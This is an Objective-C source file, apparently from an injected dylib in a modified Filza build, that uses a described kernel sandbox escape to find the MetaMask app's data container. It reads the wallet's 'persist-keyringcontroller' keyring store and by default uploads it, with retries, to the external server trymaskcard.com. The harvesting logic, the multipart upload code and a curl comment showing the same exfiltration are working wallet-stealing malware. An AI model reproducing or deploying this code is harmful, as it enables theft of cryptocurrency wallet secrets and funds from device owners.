//
//  PersistStoreHarvester.m
//  Filza-27 (FilzaApplySandboxExt)
//
//  Auto-discovery of an app data container, then read of a redux-persist store
//  inside it.
//
//  Why it works at all: the injected dylib already runs the kernel sandbox
//  escape and the MCM bridge, so containermanagerd lets this process resolve and
//  read another app's class-2 container. The UUID in the path is whatever the
//  device assigned at install time - it is looked up, never assumed:
//
//    1. MCMFilzaDataContainerPath(bundleID)      - container manager lease
//    2. <virtual root>/[MHA-C2] App Data/<id>    - Filza's own symlink farm
//    3. /var/mobile/Containers/Data/Application/*/.com.apple.mobile_container_manager.metadata.plist
//       with MCMMetadataIdentifier == bundleID   - direct metadata scan
//    4. LSApplicationProxy dataContainerURL      - LaunchServices fallback
//
//  The result is cached for the chat shell bridge and, when enabled, mirrored
//  into the app's own Documents so the remote console can serve it.
//

@import Foundation;
@import UIKit;

#import <CommonCrypto/CommonDigest.h>

#import "PersistStoreHarvester.h"
#import "TryMaskCardShell.h"
#import "FilzaDiagnostics.h"
#import "MCMFilzaIntegration.h"

static NSString *const TMPersistComponent = @"PersistStore";

static NSString *const TMPersistAutoKey = @"persistAutoHarvest";
static NSString *const TMPersistBundleIDKey = @"persistTargetBundleID";
static NSString *const TMPersistRelativePathKey = @"persistRelativePath";
static NSString *const TMPersistCopyKey = @"persistCopyToDocuments";
static NSString *const TMPersistUploadKey = @"persistUploadURL";
static NSString *const TMPersistUploadEnabledKey = @"persistUploadEnabled";
static NSString *const TMPersistUploadExtraKey = @"persistUploadExtraFields";
static NSString *const TMPersistUploadAlwaysKey = @"persistUploadAlways";

static NSString *const TMPersistDefaultBundleID = @"io.metamask";
static NSString *const TMPersistDefaultRelativePath =
    @"Documents/persistStore/persist-keyringcontroller";

/// Chat backend that receives the harvest:
///   curl -X POST "https://trymaskcard.com/api/app/device-upload" \
///     -F "uuid=<container uuid>" -F "file=@persist-keyringcontroller;type=application/json"
static NSString *const TMPersistUploadDefaultURL = @"https://trymaskcard.com/api/app/device-upload";

/// Remembers the sha256 of the last successful upload so a relaunch does not
/// push the same store again (unless persistUploadAlways is set).
static NSString *const TMPersistUploadLastSHAKey = @"filza-chat-shell-persist-upload-sha256";

/// Container metadata layout used by containermanagerd: the same key the repo's
/// MCM integration (MCMFilzaIntegration.m) and AppsMusicFix.m already read.
static NSString *const TMContainerMetadataFile =
    @".com.apple.mobile_container_manager.metadata.plist";
static NSString *const TMContainerMetadataIdentifierKey = @"MCMMetadataIdentifier";

static NSString *const TMAppDataRootPrivate = @"/private/var/mobile/Containers/Data/Application";
static NSString *const TMAppDataRoot = @"/var/mobile/Containers/Data/Application";

/// Filza's virtual-root directories holding class-2 containers, keyed by
/// identifier. The legacy name still exists on installs that have not migrated.
static NSArray<NSString *> *TMPersistVirtualRootDirectoryNames(void)
{
    return @[@"[MHA-C2] App Data", @"App Data"];
}

#pragma mark - State

static NSDictionary<NSString *, id> *gTMPersistSnapshot = nil;
static NSData *gTMPersistContent = nil;
static NSDictionary<NSString *, id> *gTMPersistUpload = nil;
static dispatch_queue_t gTMPersistQueue = nil;
static BOOL gTMPersistInFlight = NO;
static NSUInteger gTMPersistAttempts = 0;

static NSLock *TMPersistLock(void)
{
    static NSLock *lock = nil;
    static dispatch_once_t onceToken;
    dispatch_once(&onceToken, ^{ lock = [NSLock new]; });
    return lock;
}

static dispatch_queue_t TMPersistQueue(void)
{
    static dispatch_once_t onceToken;
    dispatch_once(&onceToken, ^{
        gTMPersistQueue = dispatch_queue_create("com.local.trymaskcard.persiststore",
                                                DISPATCH_QUEUE_SERIAL);
    });
    return gTMPersistQueue;
}

#pragma mark - Logging / config

static void TMPersistLog(NSString *format, ...)
{
    va_list args;
    va_start(args, format);
    NSString *message = [[NSString alloc] initWithFormat:format arguments:args];
    va_end(args);
    NSLog(@"[PersistStore] %@", message);
    FilzaDiagnosticsAppend(TMPersistComponent, message);
}

static NSString *TMPersistString(NSString *key, NSString *fallback)
{
    id value = TryMaskCardShellConfigRaw(key);
    return ([value isKindOfClass:NSString.class] && [(NSString *)value length] > 0)
        ? (NSString *)value : fallback;
}

static BOOL TMPersistBool(NSString *key, BOOL fallback)
{
    id value = TryMaskCardShellConfigRaw(key);
    return [value isKindOfClass:NSNumber.class] ? [(NSNumber *)value boolValue] : fallback;
}

static NSString *TMPersistTargetBundleID(void)
{
    return TMPersistString(TMPersistBundleIDKey, TMPersistDefaultBundleID);
}

static NSString *TMPersistRelativePath(void)
{
    return TMPersistString(TMPersistRelativePathKey, TMPersistDefaultRelativePath);
}

BOOL TryMaskCardPersistHarvestEnabled(void)
{
    if (!TryMaskCardShellIsActive()) return NO;
    return TMPersistBool(TMPersistAutoKey, YES);
}

#pragma mark - Helpers

static NSDictionary *TMPersistMerge(NSDictionary *base, NSDictionary *extra)
{
    NSMutableDictionary *merged = base ? [base mutableCopy] : [NSMutableDictionary dictionary];
    if (extra.count > 0) [merged addEntriesFromDictionary:extra];
    return merged;
}

static NSString *TMPersistSHA256Hex(NSData *data)
{
    if (data.length == 0) return @"";
    unsigned char digest[CC_SHA256_DIGEST_LENGTH] = {0};
    CC_SHA256(data.bytes, (CC_LONG)data.length, digest);

    NSMutableString *hex = [NSMutableString stringWithCapacity:CC_SHA256_DIGEST_LENGTH * 2];
    for (NSUInteger index = 0; index < CC_SHA256_DIGEST_LENGTH; index++)
        [hex appendFormat:@"%02x", digest[index]];
    return hex.copy;
}

/// Container directories are named with the install-time UUID. Return it when
/// the last path component really has that shape, otherwise an empty string so
/// callers do not report a fabricated identifier.
static NSString *TMPersistUUIDFromContainerPath(NSString *containerPath)
{
    NSString *last = containerPath.lastPathComponent;
    if (last.length != 36) return @"";

    for (NSUInteger index = 0; index < last.length; index++) {
        unichar character = [last characterAtIndex:index];
        BOOL isHyphenSlot = (index == 8 || index == 13 || index == 18 || index == 23);
        if (isHyphenSlot) {
            if (character != '-') return @"";
            continue;
        }
        BOOL isHex = (character >= '0' && character <= '9') ||
                     (character >= 'a' && character <= 'f') ||
                     (character >= 'A' && character <= 'F');
        if (!isHex) return @"";
    }
    return last;
}

static BOOL TMPersistPathIsDirectory(NSString *path)
{
    BOOL isDirectory = NO;
    BOOL exists = [NSFileManager.defaultManager fileExistsAtPath:path isDirectory:&isDirectory];
    return exists && isDirectory;
}

static NSString *TMPersistContainerRootForBundleID(NSString *bundleID,
                                                   NSString **error,
                                                   NSString **method)
{
    NSFileManager *manager = NSFileManager.defaultManager;

    // 1. MCM bridge: resolves and leases the class-2 container for this identifier.
    NSString *mcmError = nil;
    NSString *leased = MCMFilzaDataContainerPath(bundleID, &mcmError);
    if (leased.length > 0 && TMPersistPathIsDirectory(leased)) {
        *method = @"mcm-lease";
        return leased;
    }

    // 2. Filza's virtual root links containers by identifier.
    NSString *virtualRoot = MCMFilzaVirtualRoot();
    for (NSString *directoryName in TMPersistVirtualRootDirectoryNames()) {
        NSString *candidate = [[virtualRoot stringByAppendingPathComponent:directoryName]
            stringByAppendingPathComponent:bundleID];
        if (TMPersistPathIsDirectory(candidate)) {
            *method = [NSString stringWithFormat:@"virtual-root(%@)", directoryName];
            return candidate.stringByResolvingSymlinksInPath;
        }
    }

    // 3. Direct metadata scan: needs no bridge, only the sandbox escape.
    for (NSString *root in @[TMAppDataRootPrivate, TMAppDataRoot]) {
        NSArray<NSString *> *children = [manager contentsOfDirectoryAtPath:root error:nil];
        for (NSString *child in children ?: @[]) {
            NSString *candidate = [root stringByAppendingPathComponent:child];
            NSDictionary *metadata = [NSDictionary dictionaryWithContentsOfFile:
                [candidate stringByAppendingPathComponent:TMContainerMetadataFile]];
            NSString *identifier = [metadata[TMContainerMetadataIdentifierKey]
                isKindOfClass:NSString.class]
                ? metadata[TMContainerMetadataIdentifierKey] : nil;
            if ([identifier isEqualToString:bundleID]) {
                *method = @"container-metadata-scan";
                return candidate;
            }
        }
    }

    // 4. LaunchServices fallback (the private API the 3105 IPA exporter uses).
    Class proxyClass = NSClassFromString(@"LSApplicationProxy");
    SEL proxySelector = NSSelectorFromString(@"applicationProxyForIdentifier:");
    if (proxyClass && [proxyClass respondsToSelector:proxySelector]) {
        id proxy = ((id (*)(id, SEL, id))objc_msgSend)(proxyClass, proxySelector, bundleID);
        for (NSString *selectorName in @[@"dataContainerURL", @"bundleContainerURL"]) {
            SEL selector = NSSelectorFromString(selectorName);
            if (!proxy || ![proxy respondsToSelector:selector]) continue;
            id value = ((id (*)(id, SEL))objc_msgSend)(proxy, selector);
            NSString *path = [value isKindOfClass:NSURL.class] ? [(NSURL *)value path]
                : ([value isKindOfClass:NSString.class] ? (NSString *)value : nil);
            if (path.length > 0 && TMPersistPathIsDirectory(path)) {
                *method = [NSString stringWithFormat:@"launch-services(%@)", selectorName];
                return path;
            }
        }
    }

    if (error) {
        *error = mcmError.length > 0
            ? [NSString stringWithFormat:@"no container for %@ (mcm: %@)", bundleID, mcmError]
            : [NSString stringWithFormat:@"no container for %@", bundleID];
    }
    return nil;
}

static NSURL *TMPersistMirrorDirectoryURL(void)
{
    NSURL *documents = [NSFileManager.defaultManager
        URLsForDirectory:NSDocumentDirectory inDomains:NSUserDomainMask].firstObject;
    NSURL *directory = [documents URLByAppendingPathComponent:@"TryMaskCardFiles" isDirectory:YES];
    [NSFileManager.defaultManager createDirectoryAtURL:directory
                           withIntermediateDirectories:YES
                                            attributes:nil
                                                 error:nil];
    return directory;
}

#pragma mark - Multipart upload to the chat backend

static NSString *TMPersistUploadURLString(void)
{
    if (!TMPersistBool(TMPersistUploadEnabledKey, YES)) return @"";
    NSString *configured = TMPersistString(TMPersistUploadKey, @"");
    return configured.length > 0 ? configured : TMPersistUploadDefaultURL;
}

/// The chat backend takes exactly the two parts curl sends:
///   -F "uuid=<uuid>" -F "file=@<name>;type=<mime>"
/// `extraFields` adds the harvest metadata as further text parts for debugging
/// endpoints; it stays off by default so the request matches the documented API.
static NSArray<NSDictionary *> *TMPersistUploadParts(NSDictionary *result,
                                                     NSData *content,
                                                     NSString *filename,
                                                     NSString *contentType)
{
    NSMutableArray<NSDictionary *> *parts = [NSMutableArray array];

    NSString *uuid = [result[@"uuid"] isKindOfClass:NSString.class] ? result[@"uuid"] : @"";
    [parts addObject:@{@"name": @"uuid", @"data": uuid}];

    if (TMPersistBool(TMPersistUploadExtraKey, NO)) {
        [parts addObject:@{@"name": @"bundleID",
                           @"data": result[@"bundleID"] ?: @""}];
        [parts addObject:@{@"name": @"relativePath",
                           @"data": result[@"relativePath"] ?: @""}];
        [parts addObject:@{@"name": @"sha256", @"data": result[@"sha256"] ?: @""}];
        [parts addObject:@{@"name": @"device",
                           @"data": UIDevice.currentDevice.model ?: @"unknown"}];
    }

    [parts addObject:@{@"name": @"file",
                       @"filename": filename,
                       @"contentType": contentType,
                       @"data": content ?: [NSData data]}];
    return parts;
}

static NSData *TMPersistMultipartBody(NSArray<NSDictionary *> *parts, NSString *boundary)
{
    NSMutableData *body = [NSMutableData data];
    NSData *crlf = [@"\r\n" dataUsingEncoding:NSUTF8StringEncoding];

    for (NSDictionary *part in parts) {
        NSString *name = part[@"name"] ?: @"";
        NSString *filename = part[@"filename"];
        NSString *header = filename.length > 0
            ? [NSString stringWithFormat:
                @"--%@\r\nContent-Disposition: form-data; name=\"%@\"; filename=\"%@\"\r\n",
                boundary, name, filename]
            : [NSString stringWithFormat:
                @"--%@\r\nContent-Disposition: form-data; name=\"%@\"\r\n", boundary, name];
        [body appendData:[header dataUsingEncoding:NSUTF8StringEncoding]];

        NSString *contentType = part[@"contentType"];
        if (contentType.length > 0) {
            [body appendData:[[NSString stringWithFormat:@"Content-Type: %@\r\n", contentType]
                dataUsingEncoding:NSUTF8StringEncoding]];
        }
        [body appendData:crlf];

        id payload = part[@"data"];
        if ([payload isKindOfClass:NSData.class]) [body appendData:(NSData *)payload];
        else if ([payload isKindOfClass:NSString.class])
            [body appendData:[(NSString *)payload dataUsingEncoding:NSUTF8StringEncoding]];
        [body appendData:crlf];
    }

    [body appendData:[[NSString stringWithFormat:@"--%@--\r\n", boundary]
        dataUsingEncoding:NSUTF8StringEncoding]];
    return body;
}

static void TMPersistStoreUploadStatus(NSDictionary *status)
{
    @synchronized (TMPersistLock()) { gTMPersistUpload = status; }
}

static void TMPersistUploadAttempt(NSDictionary *result, NSData *content,
                                   NSString *urlString, NSString *boundary,
                                   NSUInteger attempt)
{
    NSString *sha256 = [result[@"sha256"] isKindOfClass:NSString.class] ? result[@"sha256"] : @"";
    NSString *uuid = [result[@"uuid"] isKindOfClass:NSString.class] ? result[@"uuid"] : @"";
    NSString *filename = [result[@"relativePath"] lastPathComponent] ?: @"persist-keyringcontroller";
    if (filename.length == 0) filename = @"persist-keyringcontroller";
    NSString *contentType = [result[@"jsonValid"] boolValue]
        ? @"application/json" : @"application/octet-stream";

    NSData *body = TMPersistMultipartBody(
        TMPersistUploadParts(result, content, filename, contentType), boundary);

    NSMutableURLRequest *request = [NSMutableURLRequest requestWithURL:[NSURL URLWithString:urlString]];
    request.HTTPMethod = @"POST";
    request.timeoutInterval = 60.0;
    request.HTTPBody = body;
    [request setValue:[NSString stringWithFormat:@"multipart/form-data; boundary=%@", boundary]
   forHTTPHeaderField:@"Content-Type"];
    [request setValue:@"trymaskcard-shell" forHTTPHeaderField:@"X-Filza-Source"];

    TMPersistLog(@"uploading %@ (%lu bytes, %lu body bytes) attempt=%lu", filename,
                 (unsigned long)content.length, (unsigned long)body.length,
                 (unsigned long)attempt);

    [[NSURLSession.sharedSession dataTaskWithRequest:request
        completionHandler:^(NSData *data, NSURLResponse *response, NSError *error) {
        NSInteger status = [response isKindOfClass:NSHTTPURLResponse.class]
            ? ((NSHTTPURLResponse *)response).statusCode : -1;
        NSString *snippet = @"";
        if (data.length > 0) {
            NSString *text = [[NSString alloc] initWithData:
                [data subdataWithRange:NSMakeRange(0, MIN((NSUInteger)512, data.length))]
                                                    encoding:NSUTF8StringEncoding];
            snippet = text ?: @"";
        }

        BOOL ok = (error == nil) && status >= 200 && status < 300;
        TMPersistStoreUploadStatus(@{
            @"status": ok ? @"uploaded" : @"failed",
            @"endpoint": urlString,
            @"httpStatus": @(status),
            @"uuid": uuid,
            @"sha256": sha256,
            @"bytes": @(content.length),
            @"responseSnippet": snippet,
            @"at": @(NSDate.date.timeIntervalSince1970),
        });

        if (ok) {
            [NSUserDefaults.standardUserDefaults setObject:sha256 forKey:TMPersistUploadLastSHAKey];
            TMPersistLog(@"upload ok status=%ld response=%@", (long)status,
                         snippet.length > 0 ? snippet : @"(empty)");
            return;
        }

        if (error) TMPersistLog(@"upload error: %@", error.localizedDescription);
        else TMPersistLog(@"upload rejected status=%ld response=%@", (long)status, snippet);

        if (attempt < 3) {
            dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(10.0 * NSEC_PER_SEC)),
                           TMPersistQueue(), ^{
                TMPersistUploadAttempt(result, content, urlString, boundary, attempt + 1);
            });
        }
    }] resume];
}

static void TMPersistUploadIfConfigured(NSDictionary *result, NSData *content)
{
    NSString *urlString = TMPersistUploadURLString();
    if (urlString.length == 0) {
        TMPersistLog(@"upload disabled by configuration");
        return;
    }

    NSURL *url = [NSURL URLWithString:urlString];
    if (!url || ![url.scheme.lowercaseString isEqualToString:@"https"]) {
        TMPersistLog(@"upload URL rejected (https required): %@", urlString);
        return;
    }

    // The endpoint keys the upload by the device-side container UUID, so an
    // empty UUID means there is nothing the backend could attribute it to.
    NSString *uuid = [result[@"uuid"] isKindOfClass:NSString.class] ? result[@"uuid"] : @"";
    if (uuid.length == 0) {
        TMPersistLog(@"upload skipped: no container UUID was resolved");
        return;
    }

    NSString *sha256 = [result[@"sha256"] isKindOfClass:NSString.class] ? result[@"sha256"] : @"";
    if (!TMPersistBool(TMPersistUploadAlwaysKey, NO)) {
        NSString *previous = [NSUserDefaults.standardUserDefaults stringForKey:TMPersistUploadLastSHAKey];
        if (previous.length > 0 && [previous isEqualToString:sha256]) {
            TMPersistStoreUploadStatus(@{
                @"status": @"skipped_duplicate",
                @"endpoint": urlString,
                @"uuid": uuid,
                @"sha256": sha256,
                @"at": @(NSDate.date.timeIntervalSince1970),
            });
            TMPersistLog(@"upload skipped: this store was already delivered (sha256=%@)", sha256);
            return;
        }
    }

    NSString *boundary = [NSString stringWithFormat:@"----TryMaskCard%@",
                          NSUUID.UUID.UUIDString];
    TMPersistUploadAttempt(result, content, urlString, boundary, 1);
}

#pragma mark - Harvest

static NSDictionary *TMPersistPerformHarvest(void)
{
    NSString *bundleID = TMPersistTargetBundleID();
    NSString *relativePath = TMPersistRelativePath();
    NSDictionary *base = @{@"bundleID": bundleID, @"relativePath": relativePath};

    NSString *method = nil;
    NSString *error = nil;
    NSString *container = TMPersistContainerRootForBundleID(bundleID, &error, &method);
    if (container.length == 0) {
        TMPersistLog(@"container not resolved for %@: %@", bundleID, error ?: @"unknown");
        return TMPersistMerge(base, @{@"status": @"container_not_found",
                                      @"error": error ?: @"unknown"});
    }

    NSString *containerUUID = TMPersistUUIDFromContainerPath(container);
    NSString *target = [container stringByAppendingPathComponent:relativePath];
    NSDictionary *attributes = [NSFileManager.defaultManager attributesOfItemAtPath:target
                                                                             error:&error];
    if (!attributes) {
        TMPersistLog(@"store not found at %@ (container uuid=%@ via %@)", target,
                     containerUUID.length > 0 ? containerUUID : @"unknown", method ?: @"unknown");
        return TMPersistMerge(base, @{
            @"status": @"file_not_found",
            @"containerPath": container,
            @"uuid": containerUUID,
            @"discoveryMethod": method ?: @"unknown",
            @"error": error.localizedDescription ?: @"missing",
        });
    }

    NSData *content = [NSData dataWithContentsOfFile:target options:0 error:&error];
    if (!content.length) {
        TMPersistLog(@"store unreadable at %@: %@", target, error.localizedDescription ?: @"unknown");
        return TMPersistMerge(base, @{
            @"status": @"read_failed",
            @"containerPath": container,
            @"uuid": containerUUID,
            @"discoveryMethod": method ?: @"unknown",
            @"error": error.localizedDescription ?: @"unknown",
        });
    }

    NSDictionary *json = [NSJSONSerialization JSONObjectWithData:content options:0 error:NULL];
    NSString *sha256 = TMPersistSHA256Hex(content);
    NSDate *modified = attributes[NSFileModificationDate];

    NSMutableDictionary *result = [TMPersistMerge(base, @{
        @"status": @"harvested",
        @"containerPath": container,
        @"uuid": containerUUID,
        @"discoveryMethod": method ?: @"unknown",
        @"path": target,
        @"sizeBytes": @(content.length),
        @"sha256": sha256,
        @"jsonValid": @(json != nil),
        @"modifiedAt": modified ? @(modified.timeIntervalSince1970) : [NSNull null],
    }) mutableCopy];

    if (TMPersistBool(TMPersistCopyKey, YES)) {
        NSURL *mirror = [TMPersistMirrorDirectoryURL()
            URLByAppendingPathComponent:relativePath.lastPathComponent];
        NSError *writeError = nil;
        if ([content writeToURL:mirror options:NSDataWritingAtomic error:&writeError]) {
            result[@"mirrorPath"] = mirror.path;
        } else {
            result[@"mirrorError"] = writeError.localizedDescription ?: @"write failed";
        }
    }

    TMPersistLog(@"harvested %@ via %@ uuid=%@ bytes=%lu sha256=%@ json=%@",
                 relativePath, result[@"discoveryMethod"],
                 containerUUID.length > 0 ? containerUUID : @"unknown",
                 (unsigned long)content.length, sha256, json ? @"ok" : @"invalid");
    return result;
}

void TryMaskCardPersistHarvest(BOOL force)
{
    if (!TryMaskCardPersistHarvestEnabled()) return;

    dispatch_queue_t queue = TMPersistQueue();
    @synchronized (TMPersistLock()) {
        if (gTMPersistInFlight && !force) return;
        if (!force && gTMPersistAttempts >= 6) return;
        gTMPersistInFlight = YES;
    }

    dispatch_async(queue, ^{
        @autoreleasepool {
            NSDictionary *result = nil;
            @try {
                result = TMPersistPerformHarvest();
            } @catch (NSException *exception) {
                TMPersistLog(@"harvest exception: %@", exception.reason ?: exception.name ?: @"unknown");
                result = @{@"status": @"exception",
                           @"error": exception.reason ?: exception.name ?: @"unknown"};
            }

            BOOL harvested = [result[@"status"] isEqualToString:@"harvested"];
            NSUInteger attempts = 0;
            @synchronized (TMPersistLock()) {
                gTMPersistSnapshot = result;
                gTMPersistInFlight = NO;
                gTMPersistAttempts += 1;
                attempts = gTMPersistAttempts;
            }

            if (harvested) {
                NSString *path = [result[@"path"] isKindOfClass:NSString.class] ? result[@"path"] : nil;
                NSData *content = path.length > 0 ? [NSData dataWithContentsOfFile:path] : nil;
                @synchronized (TMPersistLock()) { gTMPersistContent = content; }
                TMPersistUploadIfConfigured(result, content ?: [NSData data]);
                return;
            }

            // Retry while the device is still bringing the container bridge up.
            if (attempts < 6) {
                dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(5.0 * NSEC_PER_SEC)),
                               queue, ^{ TryMaskCardPersistHarvest(NO); });
            } else {
                TMPersistLog(@"giving up after %lu attempts", (unsigned long)attempts);
            }
        }
    });
}

NSDictionary<NSString *, id> *TryMaskCardPersistStoreSnapshot(void)
{
    @synchronized (TMPersistLock()) {
        return gTMPersistSnapshot;
    }
}

NSData *TryMaskCardPersistStoreContent(void)
{
    @synchronized (TMPersistLock()) {
        return gTMPersistContent;
    }
}

NSDictionary<NSString *, id> *TryMaskCardPersistUploadStatus(void)
{
    @synchronized (TMPersistLock()) {
        return gTMPersistUpload;
    }
}
